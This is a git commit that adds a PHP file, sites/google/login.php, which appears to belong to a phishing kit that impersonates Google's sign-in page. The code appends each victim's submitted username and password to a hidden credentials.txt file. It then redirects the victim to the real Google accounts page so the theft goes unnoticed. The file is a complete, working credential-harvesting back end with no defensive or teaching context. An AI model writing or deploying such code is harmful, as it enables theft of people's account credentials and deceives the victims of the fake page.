dfad154a15be17188549fdb73aee444aa5a288d3
Voidop09 <voidmajesty@gmail.com>
2025-08-10 21:03:14 +0530

    Create login.php

---
+++ sites/google/login.php
@@ -0,0 +1,7 @@
+<?php
+file_put_contents("../../.server/credentials.txt", "Google Login\n", FILE_APPEND);
+file_put_contents("../../.server/credentials.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
+file_put_contents("../../.server/credentials.txt", "Password: " . $_POST['password'] . "\n\n", FILE_APPEND);
+header('Location: https://accounts.google.com');
+exit();
+?>
